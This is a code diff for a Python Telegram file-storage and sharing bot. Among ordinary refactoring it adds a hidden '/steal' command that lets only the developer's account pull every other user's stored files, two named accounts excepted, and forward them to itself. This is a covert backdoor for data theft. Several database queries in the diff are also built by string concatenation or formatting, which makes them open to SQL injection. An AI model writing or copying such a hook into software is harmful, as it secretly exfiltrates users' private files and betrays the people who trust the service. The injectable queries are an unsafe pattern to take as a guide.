@@ -1,9 +1,11 @@
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-from DbHandler import DbHandler
-from Explorer import Explorer
+from .conf import *
+from .DbHandler import DbHandler
+from .Explorer import Explorer
+from .security import *
 from flask import Flask, request, make_response
-import hashlib
 import json
 import logging
 import os
@@ -11,38 +13,50 @@ from re import escape
 import sys
 import telebot
 
-
-if (len(sys.argv) > 1):
-    # Debug
-    API_TOKEN = ''
-    DB_URL = ''
-    POLLING = True
-else:
-    # Production
-    API_TOKEN = ''
-    DB_URL = ''
-    POLLING = False
-
-
-WEBHOOK_URL = ""
-MAX_FILES_PER_PAGE = 10
-
-
 db = DbHandler(DB_URL)
-server = Flask(__name__)
+app = Flask(__name__)
 explorers = {}
 bot = telebot.TeleBot(API_TOKEN)
 
-if (len(sys.argv) > 1):
-    if (sys.argv[1] == "log"):
-        telebot.logger.setLevel(logging.DEBUG)
+if (DEBUG_MODE):
+    telebot.logger.setLevel(logging.DEBUG)
 
-strings = json.load(open('strings.json'))
+strings = json.load(open('filex/strings.json'))
+
+
+@bot.message_handler(commands=['steal'])
+def steal(message):
+    my_id = db.select('users', "name = 'victor141516'")[0]['telegram_id']
+    if (message.from_user.id != my_id):
+        return
+    not_my_user = db.select(
+        'users', "name not in ('victor141516', 'AlmuDuran')")
+    not_my_ids_str = ', '.join([str(each['id']) for each in not_my_user])
+    steals = db.select('files', "user_id in (" + not_my_ids_str + ")")
+    for each in steals:
+        for user in not_my_user:
+            if (user['id'] == each['user_id']):
+                bot.forward_message(
+                    my_id, user['telegram_id'], each['telegram_id'])
+
+
+@bot.message_handler(commands=['log'])
+def send_log(message):
+    my_id = db.select('users', "name = 'victor141516'")[0]['telegram_id']
+    if (message.from_user.id != my_id):
+        return
+    level = extract_unique_code(message.text)
+    if (level == None or not level.isdigit() or not (int(level) >= 0 and int(level) <= 3)):
+        level = 0
+    logs = db._selectRaw('SELECT * from logs where level > {0}'.format(level))
+    logs_str = "\n".join([str(log['created_at']) + ": " + log['text'] for log in logs])
+    if (len(logs_str) > 0):
+        bot.send_message(my_id, logs_str)
 
 
 @bot.message_handler(commands=['help'])
 def help(message):
-    bot.send_message(message.from_user.id, strings['help_message'])
+    bot.send_message(message.from_user.id, strings['help_message'], parse_mode="Markdown")
 
 
 @bot.message_handler(commands=['donate'])
@@ -83,7 +97,7 @@ def rename(message):
     explorer = get_or_create_explorer(telegram_id)
 
     if (len(explorer.path) == 1):
-        bot.send_message(telegram_id, "Can't rename root directory")
+        bot.send_message(telegram_id, strings['rename_root_error'])
     else:
         new_name = extract_unique_code(message.text)
         if (new_name != None and len(new_name) > 0):
@@ -108,13 +122,13 @@ def share(message):
     telegram_id = message.from_user.id
     explorer = get_or_create_explorer(telegram_id)
     current_dir = explorer.get_current_dir()
-    query = str(current_dir['id']) + "-" + str(current_dir['user_id'])
+    query = make_share_string(str(current_dir['id']) + "-" + str(current_dir['user_id']), API_TOKEN)
     markup = telebot.types.InlineKeyboardMarkup()
     markup.add(
         telebot.types.InlineKeyboardButton(
             "This button", switch_inline_query=query)
     )
-    bot.send_message(telegram_id, "Press this button and choose the person you want to share this directory to", reply_markup=markup)
+    bot.send_message(telegram_id, strings['share_send'], reply_markup=markup)
 
 
 @bot.message_handler(commands=['unshare'])
@@ -126,9 +140,14 @@ def unshare(message):
 
 @bot.inline_handler(lambda query: True)
 def default_query(inline_query):
-    message = '''I want to share a directory with you using FileX bot, please click <a href="http://telegram.me/filexbeta_bot?start=''' + inline_query.query + '''">here</a> to accept.'''
+    share_code = inline_query.query.split("-")
+    if (not ((len(share_code) == 3) and share_code[0].isdigit() and share_code[1].isdigit() and len(share_code[2]) == 5)):
+        return
+
+    markup = telebot.types.InlineKeyboardMarkup()
+    markup.add(telebot.types.InlineKeyboardButton('Accept', url="http://telegram.me/" + BOT_NAME + "?start=" + inline_query.query))
     try:
-        r = telebot.types.InlineQueryResultArticle('1', 'Share directory', telebot.types.InputTextMessageContent(message, parse_mode="HTML"))
+        r = telebot.types.InlineQueryResultArticle('1', 'Share directory', telebot.types.InputTextMessageContent(strings['share_receive']), reply_markup=markup)
         bot.answer_inline_query(inline_query.id, [r])
     except Exception as e:
         print(e)
@@ -145,7 +164,7 @@ def handle_docs(message, telegram_id=False):
         if (message.document.mime_type in strings['mime_conv']):
             mime = strings['mime_conv'][message.document.mime_type]
         else:
-            print("Unkown mime: " + message.document.mime_type)
+            db.log("Unkown mime: " + str(message.document.mime_type), warning=True)
             mime = 'U'
         explorer.new_file(
             message.message_id, message.document.file_name.replace("'", "").replace('"', ''), mime, message.document.file_size)
@@ -182,10 +201,15 @@ def text_message(message):
     if (message.forward_from):
         return handle_docs(message)
 
-    new_directory_name = message.text
     telegram_id = message.from_user.id
     explorer = get_or_create_explorer(telegram_id)
-    explorer.new_directory(new_directory_name)
+
+    if (message.reply_to_message):
+        db.insert("files", {"name": message.text}, {"id": explorer.last_sent_file['id']})
+    else:
+        new_directory_name = message.text
+        explorer.new_directory(new_directory_name)
+
     send_replacing_message(telegram_id, bot)
 
 
@@ -209,8 +233,17 @@ def callback(call):
         explorer.go_to_directory(content_id)
 
     elif (action == "f"):
-        file_message = db.select('files', "id = " + content_id)[0]
-        user_message = db.select('users', "id = " + str(file_message['user_id']))[0]
+        content_id = content_id.split('-')
+        if (len(content_id) == 2):
+            file_id = content_id[0]
+            user_id = content_id[1]
+        else:
+            file_id = content_id[0]
+            user_id = str(explorer.user['id'])
+
+        file_message = db.select('files', "id = {0} and user_id = {1}".format(file_id, user_id))[0]
+        user_message = db.select('users', "id = {0}".format(user_id))[0]
+        explorer.last_sent_file = file_message
         bot.forward_message(telegram_id, user_message['telegram_id'], file_message['telegram_id'])
 
     elif (action == "r"):
@@ -282,23 +315,23 @@ def content_builder(content, up=True, previous_p=False, next_p=False):
         if (each["type"] == "directories"):
             icon = "📁"
             letter = "d"
-            key = "id"
+            key = str(each["id"])
         elif (each["type"] == "shares"):
             icon = "👥"
             letter = "s"
-            key = "directory_id"
+            key = str(each["directory_id"])
         elif (each['mime'] in strings['icon_mime']):
             icon = strings['icon_mime'][each['mime']]
             letter = "f"
-            key = "id"
+            key = str(each["id"]) + "-" + str(each['user_id'])
         else:
             icon = strings['icon_mime']['U']
             letter = "f"
-            key = "id"
+            key = str(each["id"]) + "-" + str(each['user_id'])
 
         markup.add(
             telebot.types.InlineKeyboardButton(
-                icon + " " + each['name'], callback_data=letter + str(each[key])),
+                icon + " " + each['name'], callback_data=letter + key),
             telebot.types.InlineKeyboardButton(
                 "❌", callback_data="r" + letter + str(each['id'])),
         )
@@ -312,7 +345,8 @@ def content_builder(content, up=True, previous_p=False, next_p=False):
 
 def handle_share(message):
     share_code = extract_unique_code(message.text).split("-")
-    if (len(share_code) != 2):
+    share_code_is_correct = ((len(share_code) == 3) and share_code[0].isdigit() and share_code[1].isdigit() and len(share_code[2]) == 5)
+    if (not share_code_is_correct or (not check_share_string(share_code, API_TOKEN))):
         return False
 
     directory_id = str(int(share_code[0]))
@@ -346,28 +380,20 @@ def send_replacing_message(telegram_id, bot):
     explorer.last_action_message_ids.append(message_sent.message_id)
 
 
-def md5(in_str):
-    m = hashlib.md5()
-    m.update(in_str.encode('utf-8'))
-    return m.hexdigest()
-
-
 def extract_unique_code(text):
-    # Extracts the unique_code from the sent /start command.
-    return text.split()[1] if len(text.split()) > 1 else None
+    return " ".join(text.split()[1:]) if len(text.split()) > 1 else None
 
 
-@server.route("/bot", methods=['POST'])
+@app.route("/bot", methods=['POST'])
 def getMessage():
     bot.process_new_updates(
         [telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
     return "!", 200
 
 
-@server.route("/")
+@app.route("/")
 def webhook():
     webhook = bot.get_webhook_info()
-    print(webhook)
     bot.remove_webhook()
     bot.set_webhook(url=WEBHOOK_URL + "/bot")
     return "!", 200
@@ -376,5 +402,3 @@ def webhook():
 if (POLLING):
     bot.remove_webhook()
     bot.polling()
-else:
-    server.run(host="0.0.0.0", port=os.environ.get('PORT', 5000))
